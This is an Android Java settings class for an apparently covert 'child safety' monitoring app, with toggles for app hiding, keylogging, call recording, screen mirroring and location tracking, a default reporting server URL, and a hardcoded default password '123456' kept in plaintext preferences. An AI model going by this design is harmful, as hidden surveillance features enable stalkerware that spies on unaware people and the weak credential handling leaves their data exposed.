package com.example.childsafetymonitor.utils;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * Manages app settings and configuration
 */
public class SettingsManager {
    private static final String PREFS_NAME = "ChildSafetySettings";
    
    // General settings
    private static final String KEY_FIRST_RUN = "first_run";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_SERVER_URL = "server_url";
    private static final String KEY_MONITORING_ENABLED = "monitoring_enabled";
    private static final String KEY_NOTIFICATION_TITLE = "notification_title";
    private static final String KEY_NOTIFICATION_TEXT = "notification_text";
    
    // Security settings
    private static final String KEY_PASSWORD = "password";
    private static final String KEY_ALWAYS_REQUIRE_PASSWORD = "always_require_password";
    private static final String KEY_HIDE_APP_ENABLED = "hide_app_enabled";
    private static final String KEY_TWO_FACTOR_ENABLED = "two_factor_enabled";
    private static final String KEY_TWO_FACTOR_EMAIL = "two_factor_email";
    
    // Monitoring features
    private static final String KEY_LOCATION_TRACKING_ENABLED = "location_tracking_enabled";
    private static final String KEY_CALL_RECORDING_ENABLED = "call_recording_enabled";
    private static final String KEY_SCREEN_MIRRORING_ENABLED = "screen_mirroring_enabled";
    private static final String KEY_KEYLOGGER_ENABLED = "keylogger_enabled";
    
    // Default values
    private static final String DEFAULT_SERVER_URL = "https://workspace.a71991932.repl.co";
    private static final String DEFAULT_NOTIFICATION_TITLE = "Child Safety App";
    private static final String DEFAULT_NOTIFICATION_TEXT = "Running to keep your child safe";
    private static final String DEFAULT_PASSWORD = "123456";
    
    private final SharedPreferences preferences;
    
    public SettingsManager(Context context) {
        preferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
    }
    
    /**
     * Check if this is the first run of the app
     */
    public boolean isFirstRun() {
        return preferences.getBoolean(KEY_FIRST_RUN, true);
    }
    
    /**
     * Set whether this is the first run of the app
     */
    public void setFirstRun(boolean isFirstRun) {
        preferences.edit().putBoolean(KEY_FIRST_RUN, isFirstRun).apply();
    }
    
    /**
     * Get the unique device ID
     */
    public String getDeviceId() {
        return preferences.getString(KEY_DEVICE_ID, null);
    }
    
    /**
     * Set the unique device ID
     */
    public void setDeviceId(String deviceId) {
        preferences.edit().putString(KEY_DEVICE_ID, deviceId).apply();
    }
    
    /**
     * Get the server URL
     */
    public String getServerUrl() {
        return preferences.getString(KEY_SERVER_URL, DEFAULT_SERVER_URL);
    }
    
    /**
     * Set the server URL
     */
    public void setServerUrl(String serverUrl) {
        preferences.edit().putString(KEY_SERVER_URL, serverUrl).apply();
    }
    
    /**
     * Check if monitoring is enabled
     */
    public boolean isMonitoringEnabled() {
        return preferences.getBoolean(KEY_MONITORING_ENABLED, false);
    }
    
    /**
     * Set whether monitoring is enabled
     */
    public void setMonitoringEnabled(boolean enabled) {
        preferences.edit().putBoolean(KEY_MONITORING_ENABLED, enabled).apply();
    }
    
    /**
     * Get the notification title
     */
    public String getNotificationTitle() {
        return preferences.getString(KEY_NOTIFICATION_TITLE, DEFAULT_NOTIFICATION_TITLE);
    }
    
    /**
     * Set the notification title
     */
    public void setNotificationTitle(String title) {
        preferences.edit().putString(KEY_NOTIFICATION_TITLE, title).apply();
    }
    
    /**
     * Get the notification text
     */
    public String getNotificationText() {
        return preferences.getString(KEY_NOTIFICATION_TEXT, DEFAULT_NOTIFICATION_TEXT);
    }
    
    /**
     * Set the notification text
     */
    public void setNotificationText(String text) {
        preferences.edit().putString(KEY_NOTIFICATION_TEXT, text).apply();
    }
    
    /**
     * Get the password
     */
    public String getPassword() {
        return preferences.getString(KEY_PASSWORD, DEFAULT_PASSWORD);
    }
    
    /**
     * Set the password
     */
    public void setPassword(String password) {
        preferences.edit().putString(KEY_PASSWORD, password).apply();
    }
    
    /**
     * Check if password is always required when returning to app
     */
    public boolean isAlwaysRequirePassword() {
        return preferences.getBoolean(KEY_ALWAYS_REQUIRE_PASSWORD, true);
    }
    
    /**
     * Set whether password is always required when returning to app
     */
    public void setAlwaysRequirePassword(boolean required) {
        preferences.edit().putBoolean(KEY_ALWAYS_REQUIRE_PASSWORD, required).apply();
    }
    
    /**
     * Check if app hiding is enabled
     */
    public boolean isHideAppEnabled() {
        return preferences.getBoolean(KEY_HIDE_APP_ENABLED, true);
    }
    
    /**
     * Set whether app hiding is enabled
     */
    public void setHideAppEnabled(boolean enabled) {
        preferences.edit().putBoolean(KEY_HIDE_APP_ENABLED, enabled).apply();
    }
    
    /**
     * Check if two-factor authentication is enabled
     */
    public boolean isTwoFactorEnabled() {
        return preferences.getBoolean(KEY_TWO_FACTOR_ENABLED, false);
    }
    
    /**
     * Set whether two-factor authentication is enabled
     */
    public void setTwoFactorEnabled(boolean enabled) {
        preferences.edit().putBoolean(KEY_TWO_FACTOR_ENABLED, enabled).apply();
    }
    
    /**
     * Get the email for two-factor authentication
     */
    public String getTwoFactorEmail() {
        return preferences.getString(KEY_TWO_FACTOR_EMAIL, "");
    }
    
    /**
     * Set the email for two-factor authentication
     */
    public void setTwoFactorEmail(String email) {
        preferences.edit().putString(KEY_TWO_FACTOR_EMAIL, email).apply();
    }
    
    /**
     * Check if location tracking is enabled
     */
    public boolean isLocationTrackingEnabled() {
        return preferences.getBoolean(KEY_LOCATION_TRACKING_ENABLED, true);
    }
    
    /**
     * Set whether location tracking is enabled
     */
    public void setLocationTrackingEnabled(boolean enabled) {
        preferences.edit().putBoolean(KEY_LOCATION_TRACKING_ENABLED, enabled).apply();
    }
    
    /**
     * Check if call recording is enabled
     */
    public boolean isCallRecordingEnabled() {
        return preferences.getBoolean(KEY_CALL_RECORDING_ENABLED, false);
    }
    
    /**
     * Set whether call recording is enabled
     */
    public void setCallRecordingEnabled(boolean enabled) {
        preferences.edit().putBoolean(KEY_CALL_RECORDING_ENABLED, enabled).apply();
    }
    
    /**
     * Check if screen mirroring is enabled
     */
    public boolean isScreenMirroringEnabled() {
        return preferences.getBoolean(KEY_SCREEN_MIRRORING_ENABLED, false);
    }
    
    /**
     * Set whether screen mirroring is enabled
     */
    public void setScreenMirroringEnabled(boolean enabled) {
        preferences.edit().putBoolean(KEY_SCREEN_MIRRORING_ENABLED, enabled).apply();
    }
    
    /**
     * Check if keylogger is enabled
     */
    public boolean isKeyloggerEnabled() {
        return preferences.getBoolean(KEY_KEYLOGGER_ENABLED, false);
    }
    
    /**
     * Set whether keylogger is enabled
     */
    public void setKeyloggerEnabled(boolean enabled) {
        preferences.edit().putBoolean(KEY_KEYLOGGER_ENABLED, enabled).apply();
    }
    
    /**
     * Reset all settings to default values
     */
    public void resetToDefaults() {
        SharedPreferences.Editor editor = preferences.edit();
        editor.clear();
        editor.putString(KEY_SERVER_URL, DEFAULT_SERVER_URL);
        editor.putString(KEY_NOTIFICATION_TITLE, DEFAULT_NOTIFICATION_TITLE);
        editor.putString(KEY_NOTIFICATION_TEXT, DEFAULT_NOTIFICATION_TEXT);
        editor.putString(KEY_PASSWORD, DEFAULT_PASSWORD);
        editor.apply();
    }
}